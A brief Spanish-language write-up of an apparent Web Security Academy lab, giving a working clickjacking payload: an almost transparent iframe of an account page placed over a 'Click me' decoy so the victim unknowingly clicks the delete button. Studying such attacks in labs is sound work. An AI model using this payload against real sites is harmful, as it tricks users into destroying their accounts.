El exploit que usé para este lab fue: 
```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 650px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:550px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a3500ec044d5bf882de298800f90015.web-security-academy.net/my-account"></iframe>
```

Básicamente había que poner el botón de "Click me" encima del delete modificando los parámetros del div, y luego cambiar la opacidad del iframe (la página que renderizamos, con sus tokens CSRF y todo) a 0.001 para que sólo se vea el "Click me" y el usuario lo clique al sentirse atraído.
